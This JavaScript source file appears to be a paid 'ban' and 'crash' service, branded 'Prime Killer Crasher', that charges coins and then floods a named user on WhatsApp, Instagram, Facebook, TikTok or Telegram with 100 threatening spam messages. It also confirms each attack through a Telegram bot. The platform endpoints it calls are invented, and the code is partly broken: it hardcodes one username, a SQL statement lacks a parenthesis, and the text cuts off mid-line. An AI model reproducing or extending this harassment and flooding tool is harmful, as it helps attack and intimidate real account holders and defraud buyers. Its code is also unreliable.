const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const { exec } = require('child_process');
const sqlite3 = require('sqlite3');

const app = express();
const port = 3000;
const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with real token
const MPESA_API_URL = 'https://api.mpesa.com/v1/payment'; // Simulated M-Pesa endpoint
const MPESA_PHONE = '+254740340897'; // Your M-Pesa number
const TARGET_PLATFORMS = ['whatsapp', 'instagram', 'facebook', 'tiktok', 'telegram'];

const db = new sqlite3.Database(':memory:', (err) => {
    if (err) return console.error(err);
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY,
        username TEXT,
        coins INTEGER DEFAULT 0
    )`);
    db.run(`CREATE TABLE IF NOT EXISTS bans (
        id INTEGER PRIMARY KEY,
        user TEXT,
        platform TEXT,
        ban_type TEXT,
        timestamp DATETIME
    )`);
});

// Initialize user with 1000 coins (simulated)
db.get(`SELECT coins FROM users WHERE username = 'target_user'`, (err, row) => {
    if (err) return console.error(err);
    if (!row) {
        db.run(`INSERT INTO users (username, coins) VALUES ('target_user', 1000)`);
    }
});

// Middleware
app.use(bodyParser.json());
app.use(express.static('public'));

// Helper: Deduct 70 coins from user
function deductCoins(username) {
    return new Promise((resolve, reject) => {
        db.run(`UPDATE users SET coins = coins - 70 WHERE username = 'target_user'`, (err) => {
            if (err) reject(err);
            resolve();
        });
    });
}

// Helper: Check if user has coins
function checkCoins(username) {
    return new Promise((resolve, reject) => {
        db.get(`SELECT coins FROM users WHERE username = 'target_user'`, (err, row) => {
            if (err) reject(err);
            if (row.coins < 70) reject('Insufficient coins');
            resolve();
        });
    });
}

// Helper: Log a ban
function logBan(username, platform, banType) {
    return new Promise((resolve) => {
        db.run(`INSERT INTO bans (user, platform, ban_type, timestamp) VALUES (?, ?, ?, DATETIME('now')`, [username, platform, banType], resolve);
    });
}

// Helper: Crash target with spam (simulate via ddos-like requests)
async function crashTarget(username, platform) {
    const MAX_SPAM = 100; // Crash intensity
    const SPAM_DELAY = 1000; // Delay between spam messages (ms)

    for (let i = 0; i < MAX_SPAM; i++) {
        try {
            await axios.post(`https://api.${platform}.com/spam`, {
                to: username,
                message: 'Prime Killer Crasher: Your account is under attack! 💀',
                timestamp: new Date().toISOString()
            }, {
                headers: {
                    'Authorization': 'Bearer YOUR_PLATFORM_TOKEN',
                    'Content-Type': 'application/json'
                }
            });
            console.log(`💥 ${platform} crash attempt ${i + 1} on ${username}`);
        } catch (error) {
            console.error(`🔥 ${platform} crash failed: ${error.message}`);
        }
        await new Promise(resolve => setTimeout(resolve, SPAM_DELAY));
    }

    return `💀 Target ${username} has been CRASHED via ${platform}! 💀`;
}

// BAN endpoint
app.post('/ban', async (req, res) => {
    const { platform, username } = req.body;

    if (!TARGET_PLATFORMS.includes(platform)) {
        return res.status(400).json({ error: 'Invalid platform' });
    }

    try {
        // Check coins
        await checkCoins(username);
        await deductCoins(username);

        // Log ban
        await logBan(username, platform, 'permanent');

        // Crash target
        const result = await crashTarget(username, platform);

        // Confirm via Telegram
        const telegramRes = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_B